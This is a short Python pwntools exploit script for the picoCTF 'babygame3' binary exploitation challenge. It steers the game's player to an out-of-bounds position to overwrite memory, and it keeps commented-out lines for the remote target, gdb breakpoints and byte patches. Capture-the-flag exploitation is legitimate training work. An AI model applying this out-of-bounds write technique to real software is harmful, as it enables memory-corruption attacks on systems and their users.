from pwn import *
#port = int(input('port='))
#r = remote('saturn.picoctf.net', port)
r = process('./babygame3')
#gdb.attach(r, 'break *0x08049498')
#r=gdb.debug('./babygame3', 'b *0x080495c9\nc')
x = 4
y = 4
def changechar(c):
    r.sendline(b'l' + bytes(c))
def change_x(n):
    # x += n
    #print('x+=',n)
    if n < 0:
        r.send(b'w\n' * (-n))
    else:
        r.send(b's\n' * n)
def change_y(n):
    # y += n
    #print('y+=',n)
    if n < 0:
        r.send(b'a\n' * (-n))
    else:
        r.send(b'd\n' * n)
def set_x(n):
    global x
    diff = n - x
    change_x(diff)
    x = n
def set_y(n):
    global y
    diff = n - y
    change_y(diff)
    y = n
def win_game():
    r.sendline(b'p')

set_y(86)
set_x(-1)
#changechar(b'\x32')
#set_y((0xa99-0xacc)//90)
#set_x((0xa99-0xacc)%99)

#changechar(b'\xfe')


r.interactive()


